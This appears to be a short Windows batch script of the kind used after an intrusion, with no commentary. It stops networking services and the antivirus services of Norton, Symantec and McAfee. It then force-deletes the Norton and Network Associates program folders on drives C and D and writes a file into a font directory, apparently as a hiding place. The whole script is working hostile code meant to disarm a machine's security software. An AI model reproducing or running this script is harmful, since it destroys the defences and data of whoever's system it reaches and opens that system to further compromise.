@echo off
net stop "Remote Registry Service" /Y
net stop "Computer Browser" /Y
net stop "server" /Y
net stop "REMOTE PROCEDURE CALL" /Y
net stop "REMOTE PROCEDURE CALL SERVICE" /Y
net stop "Remote Access Connection Manager" /Y
net stop "telnet" /Y
net stop "messenger" /Y
net stop "netbios" /Y 
net stop "Norton AntiVirus Server"
net stop "Norton AntiVirus Auto Protect Service"
net stop "Norton AntiVirus Client"
net stop "Symantec AntiVirus Client"
net stop "McShield"
net stop "navapsvc"
net stop "rtvscan"
net stop "vshield"
net stop "alertmanager"
net stop "mctaskmanager"
net stop "NProtectService"
cd C:\Program Files
rmdir "Norton SystemWorks" /s /q
rmdir "norton antivirus" /s /q
rmdir "network associates" /s /q
d:
cd d:\Program Files
rmdir "Norton SystemWorks" /s /q
rmdir "norton antivirus" /s /q
rmdir "network associates" /s /q
dir C:\winnt\fonts\ias >>C:\winnt\fonts\ias\t
pause
@:exit
@cls